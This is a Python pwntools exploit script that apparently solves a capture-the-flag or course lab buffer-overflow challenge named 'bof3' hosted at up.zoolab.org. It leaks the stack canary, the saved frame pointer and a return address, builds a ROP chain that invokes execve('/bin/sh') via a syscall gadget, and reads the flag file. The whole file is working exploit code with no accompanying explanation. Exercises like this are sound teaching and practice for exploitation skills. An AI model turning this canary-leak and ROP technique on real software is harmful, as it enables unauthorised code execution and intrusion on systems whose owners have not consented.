#!/usr/bin/env python3

import pwn
import sys

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

exe = './bof3'
port = 10261

if __name__ == '__main__':
    r = None
    if 'local' in sys.argv[1:]:
        r = pwn.process(exe, shell=False)
    else:
        r = pwn.remote('up.zoolab.org', port)

    elf = pwn.ELF(exe)
    rop = pwn.ROP(elf)
        
    pop_rdx_ret = rop.rdx   # find 'rdx'
    print(pop_rdx_ret)
    pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])
    print(pop_rsi_ret)
    pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])
    print(pop_rdi_ret)
    pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])
    print(pop_rax_ret)
    syscall = rop.find_gadget(['syscall'])
    print(syscall)
    
    # get canary
    s = "What's your name? "
    p = r.recvuntil(s.encode()).decode()
    print(p)
    s = "1" * 0x29
    r.send(s.encode())

    s = "Welcome, "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x29 : 0x30]
    p = b'\x00' + p
    p = p + b"\x00" * (8 - len(p))
    canary = pwn.u64(p)
    print("canary =", hex(canary))


    # get main rbp
    s = "What's the room number? "
    p = r.recvuntil(s.encode())
    print(p)
    s = "1" * 0x30
    r.send(s.encode())

    s = "The room number is: "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x30 : -1]
    print(p, len(p))
    p = p + b"\x00" * (8 - len(p))
    main_rbp = pwn.u64(p)
    print("main_rbp =", hex(main_rbp))

    
    # get base (return address)
    s = "What's the customer's name? "
    p = r.recvuntil(s.encode())
    print(p)
    s = "1" * 0x38
    r.send(s.encode())

    s = "The customer's name is: "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x38 : -1]
    print(p, len(p))
    p = p + b"\x00" * (8 - len(p))
    ret_addr = pwn.u64(p)
    base = ret_addr - 0x8ad0
    print("base =", hex(base))


    s = "Leave your message: "
    p = r.recvuntil(s.encode())
    print(p)

    s = b'/bin/sh\0'
    s += b"1" * (0x28 - len(s))
    s += pwn.p64(canary)
    s += pwn.p64(main_rbp)
    s += pwn.p64(base + pop_rdx_ret.address)
    s += pwn.p64(0)
    s += pwn.p64(0)
    s += pwn.p64(base + pop_rsi_ret.address)
    s += pwn.p64(0)
    binsh_addr = main_rbp - 0x40 # put binsh in the top of the stack (buf[32]) 
    print("binsh_addr =", hex(binsh_addr))
    s += pwn.p64(base + pop_rdi_ret.address)
    s += pwn.p64(binsh_addr)
    s += pwn.p64(base + pop_rax_ret.address)
    s += pwn.p64(0x3b)
    s += pwn.p64(base + syscall.address)
    print(s)
    r.send(s)

    s = "cat /FLAG\n"
    r.send(s.encode())

    r.interactive()
